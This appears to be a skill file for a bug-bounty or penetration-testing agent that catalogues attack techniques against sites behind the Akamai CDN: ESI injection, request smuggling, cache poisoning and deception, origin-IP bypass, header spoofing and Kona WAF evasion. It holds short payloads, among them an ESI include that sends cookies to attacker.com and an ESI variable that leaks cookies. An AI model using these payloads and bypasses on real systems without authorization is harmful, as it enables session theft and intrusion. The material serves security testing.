---
name: akamai
description: Akamai attack surface: cache key analysis, EdgeWorkers code injection, origin shielding gaps
depends_on: []
---

# Akamai

Akamai is enterprise-tier CDN. Bug surface: cache poisoning via Akamai-specific headers, EdgeWorkers (analogous to Cloudflare Workers), origin shield bypass.

## Common Bug Classes

- Cache poisoning via `Pragma: akamai-x-get-cache-key` exposing keys
- EdgeWorkers JavaScript executing on edge with origin trust
- X-True-Client-IP header trust without verification
- AkamaiGHost server-version disclosure
- ESI (Edge Side Includes) injection on reflected parameters
- Two-parser differential request smuggling between Akamai edge and backend
- ARL (Akamai Resource Locator) misconfiguration leading to XSS
- Origin IP reachable directly if edge-only auth (Akamai, Kona WAF) is the sole access control

## ESI Injection Attacks (151 reports, $1.3M corpus)

Edge Side Includes are processed by Akamai's edge servers. If user input reflects into an ESI-processed response:
1. Test for ESI tag injection on every reflected parameter: `<esi:include src="http://attacker.com/steal?cookie=" />`
2. If ESI processes the tag, you get SSRF from the edge server and can exfiltrate response headers
3. Chain ESI injection with same-origin client-side XSS for session hijack:
   - ESI fetches an internal endpoint containing a cookie or token
   - The response renders in the victim's browser context
4. Test `<esi:comment>`, `<esi:vars>`, and `<esi:choose>` as additional injection primitives
5. Even if `<esi:include>` is filtered, `<esi:vars>$(HTTP_COOKIE)</esi:vars>` can leak cookies

## Cache Poisoning and Request Smuggling

### Two-Parser Differential
1. Identify the HTTP parsing chain: Akamai edge -> origin server (Apache, Nginx, Tomcat, Node)
2. Send ambiguous HTTP requests (conflicting `Content-Length` and `Transfer-Encoding`)
3. Test CL.TE, TE.CL, and TE.TE (obfuscated) desync variants
4. Timing-based desync: send partial request body with a pause — if Akamai and the origin disagree on timeout behavior, this creates a smuggling window
5. HTTP/2 to HTTP/1.1 downgrade at the Akamai edge introduces request-line injection opportunities

### Cache Key Analysis
1. Send `Pragma: akamai-x-get-cache-key` to reveal the exact cache key formula
2. Also try: `Pragma: akamai-x-cache-on`, `Pragma: akamai-x-get-extracted-values`, `Pragma: akamai-x-get-request-id`
3. Compare the cache key to the actual request — any header, cookie, or parameter NOT in the key is a poisoning vector
4. Test unkeyed headers: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `Accept-Language`

### Web Cache Deception
1. For authenticated endpoints, append Akamai-cacheable extensions: `.css`, `.js`, `.jpg`, `.png`, `.gif`, `.woff2`
2. Test path confusion: `/account/settings/anything.css`, `/api/me/.jpg`
3. Check `X-Cache` or `X-Akamai-Cache-Status` headers for cache hit indicators
4. If the authenticated response is cached, it is served to any subsequent requester

## Edge-Enforced Auth Bypass

When Akamai (or Kona WAF) is the ONLY access control layer:
1. Find the origin IP (same techniques as Cloudflare: DNS history, cert transparency, mail headers, outbound connection triggers)
2. Access the origin directly — if the origin has no independent authentication, all edge-enforced auth is bypassed
3. Test internal paths that Akamai rules may not cover: `/internal/`, `/debug/`, `/api/v2/admin/`
4. Check if Akamai SiteShield is configured — if not, origin accepts connections from any IP

## ARL Misconfiguration

Akamai Resource Locators define how content is fetched and served:
1. Test for ARL-driven XSS: if the ARL passes URL parameters to an ESI or edge-rendered template
2. Check if ARL debug mode is enabled — `Pragma: akamai-x-get-extracted-values` reveals parsed parameters
3. Test for path-based ARL confusion: `/path;param=value` may be parsed differently by Akamai and the origin

## Privilege-Tier Flow Analysis

For any platform behind Akamai with multiple privilege levels:
1. Capture the legitimate privileged request and response (admin panel, owner dashboard)
2. Replay the exact request from a lower-privilege or unauthenticated session
3. Focus on endpoints where Akamai edge rules perform the authorization check — the origin may not re-validate
4. Test HTTP method override: `POST` with `X-HTTP-Method-Override: DELETE` may bypass Akamai method-based rules

## Protocol Error Path Exploitation

Every protocol error path at the Akamai edge is a potential resource leak or DoS vector:
1. TLS handshake failure (invalid cert, ALPN mismatch) — check if the error response leaks internal routing info
2. HTTP/2 stream errors (RST_STREAM, GOAWAY) — test if error handling releases resources correctly
3. `unknownProtocol` events — if Akamai's HTTP/2 handler encounters an unexpected protocol, check for connection pool exhaustion
4. Empty-record edge cases: send zero-length TLS records to probe for hangs in `SSL_peek()` equivalents

## Kona WAF Rule Bypass

Akamai's Kona WAF is their application-layer firewall. Bypass techniques:
1. **Parameter pollution**: Send duplicate parameters (`?q=safe&q=<script>`) — Kona may inspect first occurrence, backend uses last
2. **Content-Type mismatch**: Send JSON body with `Content-Type: application/x-www-form-urlencoded` — Kona parses as form, backend parses as JSON
3. **Chunked transfer splitting**: Break XSS/SQLi payloads across Transfer-Encoding chunk boundaries
4. **Unicode normalization**: Use fullwidth characters (`%EF%BC%9C` for `<`) that Kona ignores but browsers render
5. **HTTP method override**: `POST` with `X-HTTP-Method-Override: PUT` may bypass Kona rules that only inspect `POST` bodies
6. **Multipart boundary abuse**: Malformed multipart boundaries that Kona rejects (drops inspection) but the backend tolerates

## Downstream-of-Upstream CVE Mapping

When a target uses Akamai in front of a known stack:
1. Identify the upstream component (Firefox ESR in Tor, Chromium in Electron apps, OpenSSL in custom builds)
2. Map known CVEs for the upstream component to the target's specific version
3. Akamai may block some exploit payloads but not version-specific edge cases
4. Particularly effective for: WebView-based apps behind Akamai, where UXSS in the embedded engine bypasses edge WAF entirely

## Header Trust Chain Analysis

Akamai inserts and forwards headers that backends may trust implicitly:
1. `X-True-Client-IP` — test if the origin trusts this header for IP-based access control without verifying it came from Akamai
2. `Akamai-Origin-Hop` — may reveal internal routing information
3. `X-Akamai-CONFIG-LOG-DETAIL` — debug header that may leak configuration details
4. If the origin trusts any Akamai-injected header without validating the request came through Akamai, header spoofing from the origin IP bypasses all IP-based controls

## Probe Targets

- Send `Pragma: akamai-x-get-cache-key, akamai-x-cache-on, akamai-x-get-extracted-values` for debug headers
- Test header injection bypass via ESI tag injection on reflected parameters
- Send conflicting CL/TE headers to probe for request smuggling
- Test authenticated pages with cacheable extensions for cache deception
- Find origin IP via DNS history, cert search, outbound connection triggers
- Check for `X-True-Client-IP` header spoofing acceptance at the origin
- Probe for ARL-based XSS via parameter injection in edge-processed paths
- Test `PURGE` method for unauthenticated cache purging
- Enumerate edge-excluded paths: `/health`, `/status`, `/metrics`, `/debug/`

## Cross-References

`waf_bypass`, `cache_poisoning`

## Validation Requirements

- Reproduce findings with at least one alternate principal where authz is involved
- Verify version disclosure aligns with the CVE list before claiming version-specific impact
- Distinguish "tech detected" from "tech vulnerable" — many fingerprints just identify the stack
